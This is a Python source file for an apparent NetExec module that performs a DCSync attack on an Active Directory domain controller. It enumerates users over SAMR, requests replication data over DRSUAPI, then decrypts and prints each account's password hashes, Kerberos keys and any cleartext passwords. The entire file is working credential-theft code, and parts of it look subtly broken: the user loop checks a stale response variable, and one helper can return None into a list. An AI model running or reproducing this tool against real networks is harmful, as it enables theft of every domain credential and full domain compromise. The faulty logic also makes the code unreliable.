
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, DCERPC_v5, DCERPCException
from impacket.dcerpc.v5 import epm, drsuapi, transport, samr
from impacket.examples.secretsdump import NTDSHashes
from nxc.connection import connection as Connection
from impacket.nt_errors import STATUS_MORE_ENTRIES
from impacket.dcerpc.v5.dtypes import NULL
from impacket.uuid import string_to_bin
from nxc.context import Context
from impacket import ntlm, system_errors

from typing import Tuple
import os

import binascii
import struct

class NXCModule:
    """
    Use DRSUAPI over DCERPC to perform a DCSync.
    Module by @Aether, based on Impacket secretsdump.py
    """

    name = "dcsync"
    description = "DCSync over DCERPC"
    supported_protocols = ["smb", "ldap"]
    opsec_safe = True
    multiple_hosts = False

    def __init__(self, context : Context = None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self, context : Context, module_options: dict):
        r"""
        JUST_DC_USER DCSync this specific user.
        USERSFILE    DCSync users in the file provided (one per line).
        """
        self.__justUser = module_options.get("JUST_DC_USER", None)
        self.__users = None
        usersfile = module_options.get("USERSFILE", None)

        if usersfile:
            if not os.path.exists(usersfile):
                context.log.fail(f"File {usersfile} not found!")
            
            if not os.path.isfile(usersfile):
                context.log.fail(f"{usersfile} is not a file!")

            with open(usersfile) as f:
                self.__users = f.read().splitlines()
            
            if not len(self.__users):
                context.log.fail(f"{usersfile} is empty!")

    def on_login(self, context : Context, connection: Connection):
        self.__username     = connection.username
        self.__password     = connection.password
        self.__domain       = connection.domain
        self.__kdcHost      = connection.kdcHost
        self.__host         = self.__kdcHost if self.__kdcHost else connection.host
        self.__doKerberos   = connection.kerberos
        self.__lmhash       = ""
        self.__nthash       = ""
        self.__hash         = context.hash
        self.__aesKey       = context.aesKey
        self.__context      = context
        self.__getNTLMHash()

        if not self.__users:
            if self.__justUser:
                self.__users = [self.__justUser]
            else:
                self.__users = self.__getUsers()
        
        self.__doDRSUAPI()

    def __doDRSUAPI(self) -> None:
        rpcDrsuapi = self.__getRPCTransport(drsuapi.MSRPC_UUID_DRSUAPI)

        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/58f33216-d9f1-43bf-a183-87e3c899c410
        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/605b1ea1-9cdc-428f-ab7a-70120e020a3d
        requestDrsBind, drs = self.__buildDRSBind()
        respDrsBind = rpcDrsuapi.request(requestDrsBind)

        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/668abdc8-1db7-4104-9dea-feab05ff1736
        hDrs = self.__getDRSBindContextHandle(rpcDrsuapi, respDrsBind, requestDrsBind, drs)

        # Now let's get the NtdsDsaObjectGuid UUID to use when querying NCChanges
        resp = drsuapi.hDRSDomainControllerInfo(rpcDrsuapi, hDrs, self.__domain, 2)

        if resp["pmsgOut"]["V2"]["cItems"] > 0:
            NtdsDsaObjectGuid = resp["pmsgOut"]["V2"]["rItems"][0]["NtdsDsaObjectGuid"]
        else:
            self.__context.log.exception(f"Couldn't get DC info for domain {self.__domain}")
            return

        for user in self.__users:

            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/9b4bfb44-6656-4404-bcc8-dc88111658b3
            respDrsCrackNames = drsuapi.hDRSCrackNames(
                rpcDrsuapi,
                hDrs,
                0,
                drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN,
                drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
                (user,)
            )

            if resp["pmsgOut"]["V1"]["pResult"]["cItems"] != 1:
                self.__context.log.fail(f"User {user} not found!")
                continue

            if resp["pmsgOut"]["V1"]["pResult"]["rItems"][0]["status"] != 0:
                error = system_errors.ERROR_MESSAGES[
                    0x2114 + resp["pmsgOut"]["V1"]["pResult"]["rItems"][0]["status"]
                ]
                self.__context.log.fail(f"{user} - {error[0]}: {error[1]}")
                continue

            # Unique user ID
            userGuid = resp["pmsgOut"]["V1"]["pResult"]["rItems"][0]["pName"][:-1]

            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894
            request = self.__buildDRSNCChanges(userGuid, hDrs, NtdsDsaObjectGuid)
            try:
                respDrsNCChanges = rpcDrsuapi.request(request)
            except Exception:
                self.__context.log.fail("You don't have DS-Replication-Get-Changes / DS-Replication-Get-Changes-All rights or you are not admin!")
                return

            replyVersion = "V%d" % resp["pdwOutVersion"]
            hashes = NTDSDCSyncHashes.decrypt(rpcDrsuapi, resp, resp["pmsgOut"][replyVersion]["PrefixTableSrc"]["pPrefixEntry"])

            hashes = [f"{user}:{hashes}"]
            hashes.extend(
                NTDSDCSyncHashes.decryptSupplementalInfo(rpcDrsuapi, resp, resp["pmsgOut"][replyVersion]["PrefixTableSrc"]["pPrefixEntry"])
            )

            for h in hashes:
                self.__context.log.highlight(h.replace(f"{self.__domain}\\", ""))
        
        rpcDrsuapi.disconnect()

    def __getNTLMHash(self) -> None:
        if self.__hash and ":" in self.__hash[0]:
            hashList = self.__hash[0].split(":")
            self.__nthash = hashList[-1]
            self.__lmhash = hashList[0]
        elif self.__hash and ":" not in self.__hash[0]:
            self.__nthash = self.__hash[0]
            self.__lmhash = "00000000000000000000000000000000"

    def __getUsers(self) -> list:
        rpcSamr = self.__getRPCTransport(samr.MSRPC_UUID_SAMR)

        # Setup Connection
        try:
            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/d7b62596-4a46-4556-92dc-3aba6d517907
            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/1076eb2a-4f51-4c5a-a7c7-a78323b06198
            respSamrConnect2 = samr.hSamrConnect2(rpcSamr)
        except Exception:
            self.__context.log.fail("Can't enumerate users thought SAMR, maybe you are not admin and the Windows Version is >10")
            return list()
        
        serverHandle = respSamrConnect2["ServerHandle"]

        if respSamrConnect2["ErrorCode"] != 0:
            self.__context.log.exception("Connect error")
            return list()

        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/2142fd2d-0854-42c1-a9fb-2fe964e381ce
        respSamrEnumerateDomainsInSamServer = samr.hSamrEnumerateDomainsInSamServer(
            rpcSamr,
            serverHandle=serverHandle,
            enumerationContext=0,
            preferedMaximumLength=500,
        )
        if respSamrEnumerateDomainsInSamServer["ErrorCode"] != 0:
            self.__context.log.exception("Connect error")
            return list()

        domain_name = respSamrEnumerateDomainsInSamServer["Buffer"]["Buffer"][0]["Name"]
        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/47492d59-e095-4398-b03e-8a062b989123
        respSamrLookupDomainInSamServer = samr.hSamrLookupDomainInSamServer(
            rpcSamr,
            serverHandle=serverHandle,
            name=domain_name,
        )
        if respSamrLookupDomainInSamServer["ErrorCode"] != 0:
            self.__context.log.exception("Connect error")
            return list()

        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/ba710c90-5b12-42f8-9e5a-d4aacc1329fa
        respSamrOpenDomain = samr.hSamrOpenDomain(
            rpcSamr,
            serverHandle=serverHandle,
            desiredAccess=samr.MAXIMUM_ALLOWED,
            domainId=respSamrLookupDomainInSamServer["DomainId"],
        )
        if respSamrOpenDomain["ErrorCode"] != 0:
            self.__context.log.exception("Connect error")
            return list()

        domains = respSamrEnumerateDomainsInSamServer["Buffer"]["Buffer"]
        domain_handle = respSamrOpenDomain["DomainHandle"]
        # End Setup

        status = STATUS_MORE_ENTRIES
        enumerationContext = 0
        while status == STATUS_MORE_ENTRIES:
            try:
                # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6bdc92c0-c692-4ffb-9de7-65858b68da75
                enumerate_users_resp = samr.hSamrEnumerateUsersInDomain(rpcSamr, domain_handle, enumerationContext=enumerationContext)
            except DCERPCException as e:
                if str(e).find("STATUS_MORE_ENTRIES") < 0:
                    self.__context.log.fail("Error enumerating domain user(s)")
                    break
                enumerate_users_resp = e.get_packet()

            rids = [r["RelativeId"] for r in enumerate_users_resp["Buffer"]["Buffer"]]
            self.__context.log.debug(f"Full domain RIDs retrieved: {rids}")
            users = self.__getUserInfo(rpcSamr, domain_handle, rids)

            # set these for the while loop
            enumerationContext = enumerate_users_resp["EnumerationContext"]
            status = enumerate_users_resp["ErrorCode"]

        rpcSamr.disconnect()
        
        return users

    def __getUserInfo(self, dce, domain_handle, user_ids) -> list:
        self.__context.log.debug(f"Getting user info for users: {user_ids}")
        users = list()

        for user in user_ids:
            self.__context.log.debug(f"Calling hSamrOpenUser for RID {user}")

            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/0aee1c31-ec40-4633-bb56-0cf8429093c0
            open_user_resp = samr.hSamrOpenUser(
                dce,
                domain_handle,
                samr.MAXIMUM_ALLOWED,
                user
            )

            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/29ab27f6-61da-4c7d-863c-e228ee798f4d
            info_user_resp = samr.hSamrQueryInformationUser2(
                dce,
                open_user_resp["UserHandle"],
                samr.USER_INFORMATION_CLASS.UserAllInformation
            )["Buffer"]

            user_info = info_user_resp["All"]
            user_name = user_info["UserName"]

            users.append(user_name)
            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/55d134df-e257-48ad-8afa-cb2ca45cd3cc
            samr.hSamrCloseHandle(dce, open_user_resp["UserHandle"])

        return users

    def __getRPCTransport(self, uuidAPI) -> DCERPC_v5:
        stringBinding = epm.hept_map(self.__host, uuidAPI, protocol="ncacn_ip_tcp")
        self.__context.log.debug(f"StringBinding {stringBinding}")

        rpcTransport = transport.DCERPCTransportFactory(stringBinding)
        rpcTransport.setRemoteHost(self.__host)
        rpcTransport.setRemoteName(self.__host)

        rpcTransport.set_credentials(
            username=self.__username,
            password=self.__password,
            domain=self.__domain,
            lmhash=self.__lmhash,
            nthash=self.__nthash,
            aesKey=self.__aesKey
        )

        rpcTransport.set_kerberos(self.__doKerberos, self.__host)

        dcerpc = rpcTransport.get_dce_rpc()
    
        dcerpc.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        if self.__doKerberos:
            dcerpc.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        
        dcerpc.connect()
        dcerpc.bind(uuidAPI)

        return dcerpc

    def __buildDRSBind(self) -> Tuple[drsuapi.DRSBind, drsuapi.DRS_EXTENSIONS_INT]:
        request = drsuapi.DRSBind()
        request["puuidClientDsa"] = drsuapi.NTDSAPI_CLIENT_GUID

        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs["cb"] = len(drs)
        drs["dwFlags"] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | \
                            drsuapi.DRS_EXT_GETCHGREQ_V8 | drsuapi.DRS_EXT_STRONG_ENCRYPTION
        drs["SiteObjGuid"] = drsuapi.NULLGUID
        drs["Pid"] = 0
        drs["dwReplEpoch"] = 0
        drs["dwFlagsExt"] = 0
        drs["ConfigObjGUID"] = drsuapi.NULLGUID
        drs["dwExtCaps"] = 0xffffffff

        request["pextClient"]["cb"] = len(drs)
        request["pextClient"]["rgb"] = list(drs.getData())

        return (request, drs, )
    
    def __getDRSBindContextHandle(self, drsr: DCERPC_v5, resp, request: drsuapi.DRSBind, drs: drsuapi.DRS_EXTENSIONS_INT) -> bytes:
        drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()

        ppextServer = b"".join(resp["ppextServer"]["rgb"]) + b"\x00" * (
            len(drsuapi.DRS_EXTENSIONS_INT()) - resp["ppextServer"]["cb"]
        )
        drsExtensionsInt.fromString(ppextServer)

        if drsExtensionsInt["dwReplEpoch"] != 0:
            # Different epoch, we have to call DRSBind again
            drs["dwReplEpoch"] = drsExtensionsInt["dwReplEpoch"]
            request["pextClient"]["cb"] = len(drs)
            request["pextClient"]["rgb"] = list(drs.getData())
            resp = drsr.request(request)

        return resp["phDrs"]
    
    def __buildDRSNCChanges(self, userGuid: str, hDrs: bytes, NtdsDsaObjectGuid) -> drsuapi.DRSGetNCChanges:
        dsName = drsuapi.DSNAME()
        dsName["SidLen"] = 0
        # Remove '{' and '}'
        dsName["Guid"] = string_to_bin(userGuid[1:-1])
        dsName["Sid"] = ""
        dsName["NameLen"] = 0
        dsName["StringName"] = ("\x00")
        dsName["structLen"] = len(dsName.getData())

        request = drsuapi.DRSGetNCChanges()
        request["hDrs"] = hDrs
        request["dwInVersion"] = 8

        request["pmsgIn"]["tag"] = 8
        request["pmsgIn"]["V8"]["uuidDsaObjDest"] = NtdsDsaObjectGuid
        request["pmsgIn"]["V8"]["uuidInvocIdSrc"] = NtdsDsaObjectGuid

        request["pmsgIn"]["V8"]["pNC"] = dsName

        request["pmsgIn"]["V8"]["usnvecFrom"]["usnHighObjUpdate"] = 0
        request["pmsgIn"]["V8"]["usnvecFrom"]["usnHighPropUpdate"] = 0

        request["pmsgIn"]["V8"]["pUpToDateVecDest"] = NULL

        request["pmsgIn"]["V8"]["ulFlags"] =  drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        request["pmsgIn"]["V8"]["cMaxObjects"] = 1
        request["pmsgIn"]["V8"]["cMaxBytes"] = 0
        request["pmsgIn"]["V8"]["ulExtendedOp"] = drsuapi.EXOP_REPL_OBJ

        ppartialAttrSet = None

        if ppartialAttrSet is None:
            prefixTable = []
            ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
            ppartialAttrSet["dwVersion"] = 1
            ppartialAttrSet["cAttrs"] = len(NTDSHashes.ATTRTYP_TO_ATTID)
            for attId in list(NTDSHashes.ATTRTYP_TO_ATTID.values()):
                ppartialAttrSet["rgPartialAttr"].append(drsuapi.MakeAttid(prefixTable , attId))

        request["pmsgIn"]["V8"]["pPartialAttrSet"] = ppartialAttrSet
        request["pmsgIn"]["V8"]["PrefixTableDest"]["PrefixCount"] = len(prefixTable)
        request["pmsgIn"]["V8"]["PrefixTableDest"]["pPrefixEntry"] = prefixTable
        request["pmsgIn"]["V8"]["pPartialAttrSetEx1"] = NULL

        return request

class NTDSDCSyncHashes:

    @staticmethod
    def decrypt(drsr, record, prefixTable=None) -> str:
        replyVersion = "V%d" %record["pdwOutVersion"]

        rid = struct.unpack("<L", record["pmsgOut"][replyVersion]["pObjects"]["Entinf"]["pName"]["Sid"][-4:])[0]

        for attr in record["pmsgOut"][replyVersion]["pObjects"]["Entinf"]["AttrBlock"]["pAttr"]:
            try:
                attId = drsuapi.OidFromAttid(prefixTable, attr["attrTyp"])
                LOOKUP_TABLE = NTDSHashes.ATTRTYP_TO_ATTID
            except Exception as e:
                # Fallbacking to fixed table and hope for the best
                attId = attr["attrTyp"]
                LOOKUP_TABLE = NTDSHashes.NAME_TO_ATTRTYP

            if attId == LOOKUP_TABLE["dBCSPwd"]:
                if attr["AttrVal"]["valCount"] > 0:
                    encrypteddBCSPwd = b"".join(attr["AttrVal"]["pAVal"][0]["pVal"])
                    encryptedLMHash = drsuapi.DecryptAttributeValue(drsr, encrypteddBCSPwd)
                    LMHash = drsuapi.removeDESLayer(encryptedLMHash, rid)
                else:
                    LMHash = ntlm.LMOWFv1("", "")
            elif attId == LOOKUP_TABLE["unicodePwd"]:
                if attr["AttrVal"]["valCount"] > 0:
                    encryptedUnicodePwd = b"".join(attr["AttrVal"]["pAVal"][0]["pVal"])
                    encryptedNTHash = drsuapi.DecryptAttributeValue(drsr, encryptedUnicodePwd)
                    NTHash = drsuapi.removeDESLayer(encryptedNTHash, rid)
                else:
                    NTHash = ntlm.NTOWFv1("", "")

        return "%s:%s:%s:::" % (rid, LMHash.hex(), NTHash.hex())

    @staticmethod
    def decryptSupplementalInfo(drsr, record, prefixTable=None) -> list:
        # This is based on [MS-SAMR] 2.2.10 Supplemental Credentials Structures
        haveInfo = False

        returnData = list()

        domain = None
        userName = None
        replyVersion = "V%d" % record["pdwOutVersion"]
        for attr in record["pmsgOut"][replyVersion]["pObjects"]["Entinf"]["AttrBlock"]["pAttr"]:
            try:
                attId = drsuapi.OidFromAttid(prefixTable, attr["attrTyp"])
                LOOKUP_TABLE = NTDSHashes.ATTRTYP_TO_ATTID
            except Exception as e:
                # Fallbacking to fixed table and hope for the best
                attId = attr["attrTyp"]
                LOOKUP_TABLE = NTDSHashes.NAME_TO_ATTRTYP

            if attId == LOOKUP_TABLE["userPrincipalName"]:
                if attr["AttrVal"]["valCount"] > 0:
                    try:
                        domain = b"".join(attr["AttrVal"]["pAVal"][0]["pVal"]).decode("utf-16le").split("@")[-1]
                    except:
                        domain = None
                else:
                    domain = None
            elif attId == LOOKUP_TABLE["sAMAccountName"]:
                if attr["AttrVal"]["valCount"] > 0:
                    try:
                        userName = b"".join(attr["AttrVal"]["pAVal"][0]["pVal"]).decode("utf-16le")
                    except:
                        userName = "unknown"
                else:
                    userName = "unknown"
            if attId == LOOKUP_TABLE["supplementalCredentials"]:
                if attr["AttrVal"]["valCount"] > 0:
                    blob = b"".join(attr["AttrVal"]["pAVal"][0]["pVal"])
                    plainText = drsuapi.DecryptAttributeValue(drsr, blob)
                    if len(plainText) > 24:
                        haveInfo = True

        if domain is not None:
            userName = "%s\\%s" % (domain, userName)

        if haveInfo is True:

            try:
                userProperties = samr.USER_PROPERTIES(plainText)
            except:
                # On some old w2k3 there might be user properties that don't
                # match [MS-SAMR] structure, discarding them
                return

            propertiesData = userProperties["UserProperties"]
            for propertyCount in range(userProperties["PropertyCount"]):
                userProperty = samr.USER_PROPERTY(propertiesData)
                propertiesData = propertiesData[len(userProperty):]
                # For now, we will only process Newer Kerberos Keys and CLEARTEXT
                if userProperty["PropertyName"].decode("utf-16le") == "Primary:Kerberos-Newer-Keys":
                    propertyValueBuffer = binascii.unhexlify(userProperty["PropertyValue"])
                    kerbStoredCredentialNew = samr.KERB_STORED_CREDENTIAL_NEW(propertyValueBuffer)
                    data = kerbStoredCredentialNew["Buffer"]
                    for credential in range(kerbStoredCredentialNew["CredentialCount"]):
                        keyDataNew = samr.KERB_KEY_DATA_NEW(data)
                        data = data[len(keyDataNew):]
                        keyValue = propertyValueBuffer[keyDataNew["KeyOffset"]:][:keyDataNew["KeyLength"]]

                        if  keyDataNew["KeyType"] in NTDSHashes.KERBEROS_TYPE:
                            answer =  "%s:%s:%s" % (userName, NTDSHashes.KERBEROS_TYPE[keyDataNew["KeyType"]], keyValue.hex())
                        else:
                            answer =  "%s:%s:%s" % (userName, hex(keyDataNew["KeyType"]), keyValue.hex())

                        returnData.append(answer)
                elif userProperty["PropertyName"].decode("utf-16le") == "Primary:CLEARTEXT":
                    # [MS-SAMR] 3.1.1.8.11.5 Primary:CLEARTEXT Property
                    # This credential type is the cleartext password. The value format is the UTF-16 encoded cleartext password.
                    try:
                        answer = "%s:CLEARTEXT:%s" % (userName, binascii.unhexlify(userProperty["PropertyValue"]).decode("utf-16le"))
                    except UnicodeDecodeError:
                        # This could be because we're decoding a machine password. Printing it hex
                        answer = "%s:CLEARTEXT:0x%s" % (userName, userProperty["PropertyValue"].decode("utf-8"))

                    returnData.append(answer)

        return returnData
